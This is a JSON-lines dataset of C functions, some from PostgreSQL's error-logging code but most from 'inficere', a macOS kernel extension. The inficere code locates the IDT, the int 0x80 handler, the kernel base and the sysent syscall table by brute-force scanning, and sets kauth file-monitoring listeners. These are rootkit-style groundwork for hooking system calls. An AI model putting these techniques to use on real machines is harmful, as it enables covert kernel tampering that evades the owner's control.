{"docstring": "/* WIN32 */\n", "func_signal": "static void\nwrite_console(const char *line, int len)", "code": "{\n\tint\t\t\trc;\n\n#ifdef WIN32\n\n\t/*\n\t * Try to convert the message to UTF16 and write it with WriteConsoleW().\n\t * Fall back on write() if anything fails.\n\t *\n\t * In contrast to write_eventlog(), don't skip straight to write() based\n\t * on the applicable encodings.  Unlike WriteConsoleW(), write() depends\n\t * on the suitability of the console output code page.  Since we put\n\t * stderr into binary mode in SubPostmasterMain(), write() skips the\n\t * necessary translation anyway.\n\t *\n\t * WriteConsoleW() will fail if stderr is redirected, so just fall through\n\t * to writing unconverted to the logfile in this case.\n\t *\n\t * Since we palloc the structure required for conversion, also fall\n\t * through to writing unconverted if we have not yet set up\n\t * CurrentMemoryContext.\n\t */\n\tif (!in_error_recursion_trouble() &&\n\t\t!redirection_done &&\n\t\tCurrentMemoryContext != NULL)\n\t{\n\t\tWCHAR\t   *utf16;\n\t\tint\t\t\tutf16len;\n\n\t\tutf16 = pgwin32_message_to_UTF16(line, len, &utf16len);\n\t\tif (utf16 != NULL)\n\t\t{\n\t\t\tHANDLE\t\tstdHandle;\n\t\t\tDWORD\t\twritten;\n\n\t\t\tstdHandle = GetStdHandle(STD_ERROR_HANDLE);\n\t\t\tif (WriteConsoleW(stdHandle, utf16, utf16len, &written, NULL))\n\t\t\t{\n\t\t\t\tpfree(utf16);\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\t/*\n\t\t\t * In case WriteConsoleW() failed, fall back to writing the\n\t\t\t * message unconverted.\n\t\t\t */\n\t\t\tpfree(utf16);\n\t\t}\n\t}\n#else\n\n\t/*\n\t * Conversion on non-win32 platforms is not implemented yet. It requires\n\t * non-throw version of pg_do_encoding_conversion(), that converts\n\t * unconvertable characters to '?' without errors.\n\t */\n#endif\n\n\t/*\n\t * We ignore any error from write() here.  We have no useful way to report\n\t * it ... certainly whining on stderr isn't likely to be productive.\n\t */\n\trc = write(fileno(stderr), line, len);\n\t(void) rc;\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * Write errors to stderr (or by equal means when stderr is\n * not available). Used before ereport/elog can be used\n * safely (memory context, GUC load etc)\n */\n", "func_signal": "void\nwrite_stderr(const char *fmt,...)", "code": "{\n\tva_list\t\tap;\n\n#ifdef WIN32\n\tchar\t\terrbuf[2048];\t/* Arbitrary size? */\n#endif\n\n\tfmt = _(fmt);\n\n\tva_start(ap, fmt);\n#ifndef WIN32\n\t/* On Unix, we just fprintf to stderr */\n\tvfprintf(stderr, fmt, ap);\n\tfflush(stderr);\n#else\n\tvsnprintf(errbuf, sizeof(errbuf), fmt, ap);\n\n\t/*\n\t * On Win32, we print to stderr if running on a console, or write to\n\t * eventlog if running as a service\n\t */\n\tif (pgwin32_is_service())\t/* Running as a service */\n\t{\n\t\twrite_eventlog(ERROR, errbuf, strlen(errbuf));\n\t}\n\telse\n\t{\n\t\t/* Not running as service, write to stderr */\n\t\twrite_console(errbuf, strlen(errbuf));\n\t\tfflush(stderr);\n\t}\n#endif\n\tva_end(ap);\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * errcode --- add SQLSTATE error code to the current error\n *\n * The code is expected to be represented as per MAKE_SQLSTATE().\n */\n", "func_signal": "int\nerrcode(int sqlerrcode)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\n\t/* we don't bother incrementing recursion_depth */\n\tCHECK_STACK_DEPTH();\n\n\tedata->sqlerrcode = sqlerrcode;\n\n\treturn 0;\t\t\t\t\t/* return value does not matter */\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * ReThrowError --- re-throw a previously copied error\n *\n * A handler can do CopyErrorData/FlushErrorState to get out of the error\n * subsystem, then do some processing, and finally ReThrowError to re-throw\n * the original error.  This is slower than just PG_RE_THROW() but should\n * be used if the \"some processing\" is likely to incur another error.\n */\n", "func_signal": "void\nReThrowError(ErrorData *edata)", "code": "{\n\tErrorData  *newedata;\n\n\tAssert(edata->elevel == ERROR);\n\n\t/* Push the data back into the error context */\n\trecursion_depth++;\n\tMemoryContextSwitchTo(ErrorContext);\n\n\tif (++errordata_stack_depth >= ERRORDATA_STACK_SIZE)\n\t{\n\t\t/*\n\t\t * Wups, stack not big enough.  We treat this as a PANIC condition\n\t\t * because it suggests an infinite loop of errors during error\n\t\t * recovery.\n\t\t */\n\t\terrordata_stack_depth = -1;\t\t/* make room on stack */\n\t\tereport(PANIC, (errmsg_internal(\"ERRORDATA_STACK_SIZE exceeded\")));\n\t}\n\n\tnewedata = &errordata[errordata_stack_depth];\n\tmemcpy(newedata, edata, sizeof(ErrorData));\n\n\t/* Make copies of separately-allocated fields */\n\tif (newedata->message)\n\t\tnewedata->message = pstrdup(newedata->message);\n\tif (newedata->detail)\n\t\tnewedata->detail = pstrdup(newedata->detail);\n\tif (newedata->detail_log)\n\t\tnewedata->detail_log = pstrdup(newedata->detail_log);\n\tif (newedata->hint)\n\t\tnewedata->hint = pstrdup(newedata->hint);\n\tif (newedata->context)\n\t\tnewedata->context = pstrdup(newedata->context);\n\tif (newedata->schema_name)\n\t\tnewedata->schema_name = pstrdup(newedata->schema_name);\n\tif (newedata->table_name)\n\t\tnewedata->table_name = pstrdup(newedata->table_name);\n\tif (newedata->column_name)\n\t\tnewedata->column_name = pstrdup(newedata->column_name);\n\tif (newedata->datatype_name)\n\t\tnewedata->datatype_name = pstrdup(newedata->datatype_name);\n\tif (newedata->constraint_name)\n\t\tnewedata->constraint_name = pstrdup(newedata->constraint_name);\n\tif (newedata->internalquery)\n\t\tnewedata->internalquery = pstrdup(newedata->internalquery);\n\n\t/* Reset the assoc_context to be ErrorContext */\n\tnewedata->assoc_context = ErrorContext;\n\n\trecursion_depth--;\n\tPG_RE_THROW();\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n *\tInstalls a listener for the specified scope. Parameters 'scope' and 'scopelen' specifies which scope to listen for\n *\n *\tThe parameter 'prefix' is for the scope listener and may be NULL\n */\n", "func_signal": "static kern_return_t install_listener(const char *scope, size_t scopelen, const char *prefix)", "code": "{\n\tkauth_scope_callback_t callback;\n\t\n\tg_listener_scope = _MALLOC(scopelen + 1, M_TEMP, M_WAITOK);\n\t\n\tif(g_listener_scope == NULL) {\n\t\treturn KERN_FAILURE;\n\t} else {\n\t\tmemcpy(g_listener_scope, scope, scopelen);\n\t\t\n\t\tg_listener_scope[scopelen] = 0;\n\t\tg_prefix = prefix;\n\t\t\n\t\t/* register the appropriate listener with kauth */\n\t\tif(strcmp(g_listener_scope, KAUTH_SCOPE_GENERIC) == 0) {\n\t\t\tcallback = scope_listener;\n\t\t} else if(strcmp(g_listener_scope, KAUTH_SCOPE_PROCESS) == 0) {\n\t\t\tcallback = process_scope_listener;\n\t\t} else if(strcmp(g_listener_scope, KAUTH_SCOPE_VNODE) == 0) {\n\t\t\tcallback = vnode_scope_listener;\n\t\t} else if(strcmp(g_listener_scope, KAUTH_SCOPE_FILEOP) == 0) {\n\t\t\tcallback = fileop_scope_listener;\n\t\t} else {\n\t\t\tcallback = unk_scope_listener;\n\t\t}\n\t\t\n\t\tg_listener = kauth_listen_scope(g_listener_scope, callback, NULL);\n\t\t\n\t\tif(g_listener == NULL) {\n\t\t\treturn KERN_FAILURE;\n\t\t}\n\t\t\n\t\treturn KERN_SUCCESS;\n\t}\n\t\n\t/* if fail, clean up */\n\tif(g_listener_scope == NULL || g_listener == NULL) {\n\t\treturn remove_kauth_listener();\n\t}\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tXXX: not used\n */\n", "func_signal": "kern_return_t queue_userland_data(void *data)", "code": "{\n\tkern_return_t ret = KERN_FAILURE;\n\t\n\tif(data == NULL)\n\t\treturn ret;\n\t\n\tif(g_client_ctl_ref == NULL)\n\t\treturn ret;\n\t\n\tret = ctl_enqueuedata(g_client_ctl_ref, g_client_unit, data, QUEUE_DATA_SIZE, 0);\n\t\n\treturn ret;\n}", "path": "kext\\inficere\\kctl.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tExternally available functions to find sysent table\n *\tIf it fails, kext should not load\n */\n", "func_signal": "kern_return_t find_sysent(void)", "code": "{\n\t/* get sysent address */\n\tg_sysent = (struct sysent *)bruteforce_sysent();\n\t\n\tif(g_sysent == NULL) {\n\t\treturn KERN_FAILURE;\n\t}\n\t\n\treturn KERN_SUCCESS;\n}", "path": "kext\\inficere\\sysent.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tGet IDT size\n */\n", "func_signal": "uint16_t get_idt_size(void)", "code": "{\n\tuint8_t idtr[10];\n\tuint16_t size = 0;\n\t\n\t__asm__ volatile (\"sidt %0\": \"=m\" (idtr));\n\tsize = *((uint16_t *)&idtr[0]);\n\t\n\treturn size;\n}", "path": "kext\\inficere\\idt.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tRemoves installed listener + clean up.\n */\n", "func_signal": "kern_return_t remove_kauth_listener(void)", "code": "{\n\t/* prevent any more threads entering our listener */\n\tif(g_listener != NULL) {\n\t\tkauth_unlisten_scope(g_listener);\n\t\t\n\t\tg_listener = NULL;\n\t}\n\t\n\t/*\n\t * there's still a race condition here; there could still be a thread executing between\n\t * the OSDecrementAtomic and the return from the listener function (e.g. fileop_scope_listener)\n\t *\n\t * the window is very small and this only happens during reconfiguration (which it's not supposed to happen a lot)\n\t *\n\t * running this loop once is enough\n\t */\n\tdo {\n\t\tstruct timespec onesec;\n\t\t\n\t\tonesec.tv_sec  = 1;\n\t\tonesec.tv_nsec = 0;\n\t\t\n\t\t(void)msleep(&g_activation_count, NULL, PUSER, NULL, &onesec);\n\t} while(g_activation_count > 0 );\n\t\n\t/*\n\t * g_listener_scope is accessed by the listener callbacks without any form of lock\n\t * so we don't destroy them until after all listener callbacks have drained\n\t */\n\tif(g_listener_scope != NULL) {\n\t\t_FREE(g_listener_scope, M_TEMP);\n\t\t\n\t\tg_listener_scope = NULL;\n\t}\n\t\n\tg_prefix = NULL;\n\t\n\treturn KERN_SUCCESS;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tGet IDT (Interrupt Descriptor Table) address\n */\n", "func_signal": "void get_idt_addr(mach_vm_address_t *idt)", "code": "{\n\tuint8_t idtr[10];\n\t\n\t__asm__ volatile (\"sidt %0\": \"=m\" (idtr));\n\t*idt = *(mach_vm_address_t *)(idtr + 2);\n}", "path": "kext\\inficere\\idt.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tXXX: not used\n */\n", "func_signal": "static int ctl_get(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t *len)", "code": "{\n\tint retv = 0;\n\t\n\tchar *test = _MALLOC(QUEUE_DATA_SIZE, M_TEMP, M_WAITOK);\n\tmemset(test, 0, QUEUE_DATA_SIZE);\n\n\tstrncpy(test, \"testing kernel to userland\", QUEUE_DATA_SIZE);\n\t\n\tretv = queue_userland_data(test);\n\t\n\treturn retv;\n}", "path": "kext\\inficere\\kctl.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tCreates a human readable description of a vnode action bitmap\n */\n", "func_signal": "static int create_vnode_action_str(kauth_action_t action, boolean_t isDir, char **actionstrp, size_t *actionstr_lenp)", "code": "{\n\tenum { kCalcLen, kCreateString } pass;\n\tkauth_action_t actions_left;\n\tunsigned int info_idx;\n\tsize_t actionstr_len;\n\tchar *actionstr;\n\t\n\tactionstr = NULL;\n\t\n\t/*\n\t * on first pass, actionstr is null and we calculate actionstr_len, at the end we allocate actionstr\n\t * on second pass, actionstr is initialised\n\t */\n\tfor(pass = kCalcLen; pass <= kCreateString; pass++) {\n\t\tactions_left = action;\n\t\t\n\t\t/* process action bits that are described in kVnodeActionInfo. */\n\t\tinfo_idx = 0;\n\t\tactionstr_len = 0;\n\t\t\n\t\twhile((actions_left != 0) && (info_idx < kVnodeActionInfoCount)) {\n\t\t\tif(actions_left & kVnodeActionInfo[info_idx].fMask) {\n\t\t\t\tconst char *cur_str;\n\t\t\t\tsize_t cur_str_len;\n\t\t\t\t\n\t\t\t\t/* increment the length of actionstr by the action name */\n\t\t\t\t\n\t\t\t\tif(isDir && (kVnodeActionInfo[info_idx].fOpNameDir != NULL)) {\n\t\t\t\t\tcur_str = kVnodeActionInfo[info_idx].fOpNameDir;\n\t\t\t\t} else {\n\t\t\t\t\tcur_str = kVnodeActionInfo[info_idx].fOpNameFile;\n\t\t\t\t}\n\t\t\t\tcur_str_len = strlen(cur_str);\n\t\t\t\t\n\t\t\t\tif(actionstr != NULL) {\n\t\t\t\t\tmemcpy(&actionstr[actionstr_len], cur_str, cur_str_len);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tactionstr_len += cur_str_len;\n\t\t\t\t\n\t\t\t\t/* clear the bit in actions_left, indicating that we processed this one */\n\t\t\t\tactions_left &= ~kVnodeActionInfo[info_idx].fMask;\n\t\t\t\t\n\t\t\t\t/* if there is any actions left, append it prefixing '|' */\n\t\t\t\tif(actions_left != 0) {\n\t\t\t\t\tif(actionstr != NULL) {\n\t\t\t\t\t\tactionstr[actionstr_len] = '|';\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tactionstr_len += 1;\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tinfo_idx += 1;\n\t\t}\n\t\t\n\t\t/* now we include any remaining actions as a hex number */\n\t\tif(actions_left != 0) {\n\t\t\tif(actionstr != NULL) {\n\t\t\t\t/* 11 == '0' + 'x' + 8 digits + null char */\n\t\t\t\tsnprintf(&actionstr[actionstr_len], 11, \"0x%08x\", actions_left);\n\t\t\t}\n\t\t\t\n\t\t\tactionstr_len += 10; /* 0x + 8 hex digits */\n\t\t}\n\t\t\n\t\t/*\n\t\t * if we're at the end of the first pass, allocate actionstr based on the size we just calculated\n\t\t * actionstr_len is a string length, so we have to allocate an extra character for the null terminator\n\t\t * if we're at the end of the second pass, just place the null terminator\n\t\t */\n\t\tif(pass == kCalcLen) {\n\t\t\tactionstr = _MALLOC(actionstr_len + 1, M_TEMP, M_WAITOK);\n\t\t\t\n\t\t\tif(actionstr == NULL) {\n\t\t\t\treturn ENOMEM;\n\t\t\t}\n\t\t} else {\n\t\t\tactionstr[actionstr_len] = 0;\n\t\t}\n\t}\n\t\n\t/* clean up */\n\t*actionstrp = actionstr;\n\t*actionstr_lenp = actionstr_len + 1;\n\t\n\treturn 0;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tThis is responsible for parsing the new configuration string and updating the listener\n */\n", "func_signal": "static kern_return_t config_kauth(const char *config)", "code": "{\n\t/* remove the existing listener */\n\tremove_kauth_listener();\n\t\n\t/* parse the configuration string and install the new listener */\n\tif(strcmp(config, \"remove\") == 0) {\n\t\treturn KERN_SUCCESS;\n\t} else if(strprefix(config, \"add \")) {\n\t\tconst char *cursor;\n\t\tconst char *scope_start;\n\t\tconst char *scope_end;\n\t\tconst char *prefix_start;\n\t\t\n\t\t/* skip the \"add \" prefix */\n\t\tcursor = config + strlen(\"add \");\n\t\t\n\t\t/* work out the span of the scope */\n\t\tscope_start = cursor;\n\t\t\n\t\twhile((*cursor != ' ') && (*cursor != 0)) {\n\t\t\tcursor += 1;\n\t\t}\n\t\t\n\t\tscope_end = cursor;\n\t\t\n\t\tif(scope_start == scope_end) {\n\t\t\treturn KERN_FAILURE;\n\t\t} else {\n\t\t\t/* look for a prefix */\n\t\t\tif(*cursor == ' ') {\n\t\t\t\tcursor += 1;\n\t\t\t}\n\t\t\t\n\t\t\tif(*cursor == 0) {\n\t\t\t\tprefix_start = NULL;\n\t\t\t} else {\n\t\t\t\tprefix_start = cursor;\n\t\t\t}\n\t\t\t\n\t\t\treturn install_listener(scope_start, scope_end - scope_start, prefix_start);\n\t\t}\n\t} else {\n\t\treturn KERN_FAILURE;\n\t}\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tA kauth listener that's called to authorize an action in the vnode scope (KAUTH_SCOPE_VNODE)\n *\n *\tSee the artile on the top of this file for a detailed explanation of 'arg0' through 'arg3'\n */\n", "func_signal": "static int vnode_scope_listener(kauth_cred_t cred, void *data, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)", "code": "{\n\tvfs_context_t context;\n\tvnode_t vp;\n\tvnode_t dvp;\n\tchar *vp_path;\n\tchar *dvp_path;\n\tboolean_t isDir;\n\tchar *actionstr;\n\tsize_t actionstr_len = 0;\n\t\n\tOSIncrementAtomic(&g_activation_count);\n\t\n\tcontext = (vfs_context_t)arg0;\n\tvp = (vnode_t)arg1;\n\tdvp = (vnode_t)arg2;\n\t\n\tvp_path = NULL;\n\tdvp_path = NULL;\n\tactionstr = NULL;\n\t\n\tif(create_vnode_path(vp, &vp_path) != 0)\n\t\tgoto fail;\n\t\n\tif(create_vnode_path(dvp, &dvp_path) != 0)\n\t\tgoto fail;\n\t\n\tif(vp != NULL) {\n\t\tisDir = (vnode_vtype(vp) == VDIR);\n\t} else {\n\t\tisDir = FALSE;\n\t}\n\t\n\tif(create_vnode_action_str(action, isDir, &actionstr, &actionstr_len) != 0) {\n\t\tgoto fail;\n\t}\n\t\t\n\t/* requests are filtered based on g_prefix */\n\tif((g_prefix == NULL) || (((vp_path != NULL) && strprefix(vp_path, g_prefix)) || ((dvp_path != NULL) && strprefix(dvp_path, g_prefix)))) {\n\t\t/*\n\t\t *\n\t\t */\n\t}\n\nfail:\n\t/* clean up */\n\tif(actionstr != NULL) {\n\t\t_FREE(actionstr, M_TEMP);\n\t}\n\t\n\tif(vp_path != NULL) {\n\t\t_FREE(vp_path, M_TEMP);\n\t}\n\t\n\tif(dvp_path != NULL) {\n\t\t_FREE(dvp_path, M_TEMP);\n\t}\n\t\n\tOSDecrementAtomic(&g_activation_count);\n\t\n\treturn KAUTH_RESULT_DEFER;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tCreates a full path for a vnode.\n *\n *\tCallers are responsible for freeing vp_p (size is always MAXPATHLEN)\n */\n", "func_signal": "static int create_vnode_path(vnode_t vp, char **vp_p)", "code": "{\n\tint pathlen;\n\t\n\tif(vp != NULL) {\n\t\t*vp_p = _MALLOC(MAXPATHLEN, M_TEMP, M_WAITOK);\n\n\t\tif(*vp_p == NULL) {\n\t\t\treturn ENOMEM;\n\t\t}\n\t\t\n\t\tpathlen = MAXPATHLEN;\n\t\t\n\t\treturn vn_getpath(vp, *vp_p, &pathlen);\n\t}\n\t\n\treturn EINVAL;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tA kauth listener that's called to authorize an action in any scope that we don't recognise.\n *\n *\tSee the artile on the top of this file for a detailed explanation of 'arg0' through 'arg3'\n */\n", "func_signal": "static int unk_scope_listener(kauth_cred_t cred, void *data, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)", "code": "{\n\tOSIncrementAtomic(&g_activation_count);\n\t\n\tOSDecrementAtomic(&g_activation_count);\n\t\n\treturn KAUTH_RESULT_DEFER;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tInitialize the listener.\n */\n", "func_signal": "kern_return_t init_kauth_listener(void)", "code": "{\n\tif(config_kauth(g_config) != KERN_SUCCESS) {\n\t\t/* clean up if failed */\n\t\tremove_kauth_listener();\n\t}\n\t\n\treturn KERN_SUCCESS;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tFind the kernel base address (Mach-O header) by searching backwards using the int80 handler\n *\tas a starting point\n */\n", "func_signal": "mach_vm_address_t find_kbase(const mach_vm_address_t int80_addr)", "code": "{\n\tmach_vm_address_t tmp_addr = int80_addr;\n\t\n#if __LP64__\n\tstruct segment_command_64 *seg_cmd = NULL;\n\t\n\twhile(tmp_addr > 0) {\n\t\tif(*(uint32_t *)(tmp_addr) == MH_MAGIC_64) {\n\t\t\t/* make sure it's the header and not some reference to the MAGIC number */\n\t\t\tseg_cmd = (struct segment_command_64 *)(tmp_addr + sizeof(struct mach_header_64));\n\t\t\t\n\t\t\tif(strncmp(seg_cmd->segname, \"__TEXT\", 16) == 0) {\n\t\t\t\treturn tmp_addr;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif(tmp_addr -1 > tmp_addr)\n\t\t\tbreak;\n\t\t\n\t\ttmp_addr--;\n\t}\n#else\n\tstruct segment_command *seg_cmd = NULL;\n\t\n\twhile(tmp_addr > 0) {\n\t\tif(*(uint32_t *)((uint32_t)tmp_addr) == MH_MAGIC) {\n\t\t\t/* make sure it's the header and not some reference to the MAGIC number */\n\t\t\tseg_cmd = (struct segment_command *)((uint32_t)tmp_addr + sizeof(struct mach_header));\n\t\t\t\n\t\t\tif(strncmp(seg_cmd->segname, \"__TEXT\", 16) == 0) {\n\t\t\t\treturn (mach_vm_address_t)tmp_addr;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif(tmp_addr - 1 > tmp_addr)\n\t\t\tbreak;\n\t\t\n\t\ttmp_addr--;\n\t}\n#endif\n\t\n\treturn 0;\n}", "path": "kext\\inficere\\sysent.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\t32/64bit compatible brute force method to find sysent\n *\tWorks in all versions\n *\tReturns a pointer to the sysent structure\n */\n", "func_signal": "static void *bruteforce_sysent(void)", "code": "{\n\t/* get IDT address */\n\tmach_vm_address_t idt_addr = 0;\n\tget_idt_addr(&idt_addr);\n\t\n\t/* calculate the address of the int80 handler */\n\tmach_vm_address_t int80_addr = calc_int80_addr(idt_addr);\n\t\n\t/* search backwards for the kernel base address (mach-o header) */\n\tmach_vm_address_t kbase = find_kbase(int80_addr);\n\tuint64_t data_addr = 0;\n\tuint64_t data_size = 0;\n\t\n\t/* search for the __DATA segment */\n\tprocess_header(kbase, &data_addr, &data_size);\n\tuint64_t data_limit = data_addr + data_size;\n\t\n\t/* bruteforce search for sysent in __DATA segment */\n\twhile(data_addr <= data_limit) {\n\t\tstruct sysent *table = (struct sysent *)data_addr;\n\t\t\n\t\tif((void *)table != NULL &&\n\t\t   table[SYS_exit].sy_narg      == 1 &&\n\t\t   table[SYS_fork].sy_narg      == 0 &&\n\t\t   table[SYS_read].sy_narg      == 3 &&\n\t\t   table[SYS_wait4].sy_narg     == 4 &&\n\t\t   table[SYS_ptrace].sy_narg    == 4 &&\n\t\t   table[SYS_getxattr].sy_narg  == 6 &&\n\t\t   table[SYS_listxattr].sy_narg == 4 &&\n\t\t   table[SYS_recvmsg].sy_narg   == 3)\n\t\t{\n\t\t\treturn table;\n\t\t}\n\t\t\n\t\tdata_addr++;\n\t}\n\t\n\treturn NULL;\n}", "path": "kext\\inficere\\sysent.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tCalculate the address of the kernel int80 handler using the IDT array\n */\n", "func_signal": "mach_vm_address_t calc_int80_addr(const mach_vm_address_t idt_addr)", "code": "{\n\t/*\n\t * find the address of the interrupt 0x80 - EXECP64_SPC_USR(0x80, hi64_unix_scall)\n\t *\n\t * from osfmk/i386/idt64.s\n\t */\n\tstruct descriptor_idt *int80_desc;\n\tmach_vm_address_t int80_addr;\n\t\n\t/* it's necessary to calculate the address, not just directly extract the stub address */\n#if __LP64__\n\t/* get the descriptor for interrupt 0x80 */\n\t/* IDT == array of descriptors */\n\tint80_desc = (struct descriptor_idt *)(idt_addr + sizeof(struct descriptor_idt) * 0x80);\n\tuint64_t high = (unsigned long)int80_desc->offset_high << 32;\n\tuint32_t middle = (unsigned long)int80_desc->offset_middle << 16;\n\tint80_addr = (mach_vm_address_t)(high + middle + int80_desc->offset_low);\n#else\n\tint80_desc = (struct descriptor_idt *)(idt_addr + sizeof(struct descriptor_idt)*0x80);\n\tint80_addr = (mach_vm_address_t)(int80_desc->offset_middle << 16) + int80_desc->offset_low;\n#endif\n\n\treturn int80_addr;\n}", "path": "kext\\inficere\\sysent.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tA kauth listener that's called to authorize an action in the generic scope (KAUTH_SCOPE_GENERIC)\n *\n *\tFor now, we just dump the parameters to the operation and return KAUTH_RESULT_DEFER, allowing other listeners to decide it's allowed or not\n *\n *\tSee the artile on the top of this file for a detailed explanation of 'arg0' through 'arg3'\n */\n", "func_signal": "static int scope_listener(kauth_cred_t cred, void *data, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)", "code": "{\n\tOSIncrementAtomic(&g_activation_count);\n\t\n\tswitch(action) {\n\t\tcase KAUTH_GENERIC_ISSUSER:\n\t\t\t//LOG_DEBUG(\"scope=\" KAUTH_SCOPE_GENERIC \", action=KAUTH_GENERIC_ISSUSER, actor=%ld\\n\", (long)kauth_cred_getuid(cred) );\n\t\t\t\n\t\t\tbreak;\n\t\t\t\n\t\tdefault:\n\t\t\t//LOG_DEBUG(\"[ERROR] scope_listener: Unknown action (%d)\\n\", action);\n\t\t\t\n\t\t\tbreak;\n\t}\n\t\n\tOSDecrementAtomic(&g_activation_count);\n\t\n\treturn KAUTH_RESULT_DEFER;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tA kauth listener that's called to authorize an action in the file operation scope (KAUTH_SCOPE_FILEOP)\n *\n *\tSee the artile on the top of this file for a detailed explanation of 'arg0' through 'arg3'\n */\n", "func_signal": "static int fileop_scope_listener(kauth_cred_t cred, void *data, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)", "code": "{\n\tOSIncrementAtomic(&g_activation_count);\n\t\n\tconst char *pathstr = (const char *)arg1;\n\t\n\tswitch(action) {\n\t\tcase KAUTH_FILEOP_OPEN:\n\t\t\tif((g_prefix == NULL) || strprefix((const char *)arg1, g_prefix)) {\n\t\t\t\tif(strncmp(pathstr, \"/var/run/utmpx\", strlen(\"/var/run/utmpx\")) == 0) {\n\t\t\t\t\t/*\n\t\t\t\t\t *\tTODO: Find something interesting to do here. My original idea didn't work.\n\t\t\t\t\t */\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t\t\n\t\tcase KAUTH_FILEOP_CLOSE:\n\t\t\tif((g_prefix == NULL) || strprefix((const char *)arg1, g_prefix)) {\n\t\t\t\tif(strncmp(pathstr, MACH_KERNEL, strlen(MACH_KERNEL)) == 0) {\n\t\t\t\t\t/*\n\t\t\t\t\t *\tTODO: Find something interesting to do here. My original idea didn't work.\n\t\t\t\t\t */\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t\n\t\t/*\n\t\t *\tXXX: Not used\n\t\t *\n\t\tcase KAUTH_FILEOP_RENAME:\n\t\t\tif((arg0 == 0) || (arg1 == 0)) {\n\t\t\t\tLOG_DEBUG(\"KAUTH_FILEOP_RENAME\");\n\t\t\t} else {\n\t\t\t\tif((g_prefix == NULL) || (strprefix((const char *)arg0, g_prefix) || strprefix((const char *)arg1, g_prefix))) {\n\t\t\t\t\t//LOG_DEBUG(\"scope=\" KAUTH_SCOPE_FILEOP \", action=KAUTH_FILEOP_RENAME, uid=%ld, from=%s, to=%s\\n\", (long)kauth_cred_getuid(cred), (const char *)arg0, (const char *)arg1);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t\t\n\t\tcase KAUTH_FILEOP_EXCHANGE:\n\t\t\tif((arg0 == 0) || (arg1 == 0)) {\n\t\t\t\tLOG_DEBUG(\"KAUTH_FILEOP_EXCHANGE\");\n\t\t\t} else {\n\t\t\t\tif((g_prefix == NULL) || (strprefix((const char *)arg0, g_prefix) || strprefix((const char *)arg1, g_prefix))) {\n\t\t\t\t\tLOG_DEBUG(\"scope=\" KAUTH_SCOPE_FILEOP \", 